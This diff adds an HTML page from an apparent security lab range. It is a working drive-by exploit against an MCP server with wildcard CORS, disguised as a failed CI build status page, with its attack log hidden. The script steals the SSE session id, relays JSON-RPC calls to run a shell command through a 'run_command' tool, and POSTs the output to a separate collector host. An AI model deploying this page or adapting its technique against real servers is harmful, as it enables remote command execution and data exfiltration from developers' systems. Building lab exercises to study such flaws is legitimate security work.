@@ -1,0 +1,69 @@
+<!doctype html>
+<!--
+  remote.html - the "remote browser" variant of the drive-by (Meridian Range · module 01 · CVE-2026-34237).
+
+  ⛔ LAB-ONLY and SEALED. Same attack as index.html, framed to make one point explicit: the victim's
+     buildbot-mcp is reachable on a NETWORK address (another host on the lab segment), not the browser's
+     own loopback - and it is attacked with NO published port, because both the attacker's browser and the
+     victim's server are containers on labnet (internal: true). "localhost-only" was never the boundary;
+     wildcard CORS on the SDK transport is. Benign canary; nothing leaves the lab (SCOPE #2/#4).
+
+     Faithful to CVE-2026-34237: read the SSE `endpoint` event cross-origin (ACAO:* on a CORS-simple GET),
+     then relay JSON-RPC as CORS-simple text/plain POSTs; results arrive on the SSE stream.
+-->
+<meta charset="utf-8" />
+<title>Meridian CI · build #4209</title>
+<style>
+  body { font: 14px/1.5 system-ui, sans-serif; max-width: 640px; margin: 40px auto; color: #1c2530; }
+  .hdr { color: #b00020; font-weight: 600; }
+  .card { border: 1px solid #e3e8ee; border-radius: 8px; padding: 16px 20px; }
+  code { background: #f5f7fa; padding: 1px 5px; border-radius: 4px; }
+  #log { display: none; } /* the victim never needs to see the attack transcript */
+</style>
+<div class="card">
+  <p class="hdr">✗ nightly-e2e · build #4209 failed</p>
+  <p><b>main</b> @ <code>b90aa11</code> - e2e: checkout → pay flow timed out after 30000ms.</p>
+  <p>42 passed · 1 failing. This is a shared status link; sign in to Meridian CI to re-run.</p>
+</div>
+<pre id="log"></pre>
+<script>
+  // The only change from index.html: the buildbot-mcp is on another labnet host, reached by name.
+  const TARGET = "http://mcp.lab.consulereit.nl:8080";
+  const SSE = TARGET + "/mcp/sse";
+  const COLLECTOR = "http://collector.lab.consulereit.nl:9000/pwned";
+  const CANARY = "id; hostname; echo LAB_CANARY_$$";
+  const log = (m) => (document.getElementById("log").textContent += m + "\n");
+
+  const pending = new Map();
+  let messageUrl = null, sessionId = null, nextId = 1, driven = false;
+
+  const es = new EventSource(SSE);
+  es.addEventListener("endpoint", (e) => {
+    messageUrl = new URL(e.data, SSE).toString();
+    sessionId = new URL(messageUrl).searchParams.get("sessionId");
+    log("stole session id: " + sessionId);
+    drive();
+  });
+  es.addEventListener("message", (e) => {
+    try { const m = JSON.parse(e.data); if (m.id != null && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); } } catch {}
+  });
+
+  const post = (body) =>
+    fetch(messageUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify(body) }).catch(() => {});
+  const rpc = (method, params) =>
+    new Promise((resolve) => { const id = nextId++; pending.set(id, resolve); post({ jsonrpc: "2.0", id, method, params }); });
+
+  async function drive() {
+    if (driven) return; driven = true;
+    await rpc("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "attacker.lab.consulereit.nl", version: "0.0.0" } });
+    post({ jsonrpc: "2.0", method: "notifications/initialized" });
+    const builds = await rpc("tools/call", { name: "list_builds", arguments: {} });
+    log("recon (list_builds):\n" + (builds.result?.content?.[0]?.text ?? ""));
+    const out = (await rpc("tools/call", { name: "run_command", arguments: { cmd: CANARY } })).result?.content?.[0]?.text ?? "";
+    log("exec output:\n" + out);
+    fetch(COLLECTOR, { method: "POST", headers: { "content-type": "text/plain" },
+      body: JSON.stringify({ module: "01-cors-hijack-remote", sessionId, output: out }) }).catch(() => {});
+    log("exfiltrated ✓");
+    es.close();
+  }
+</script>
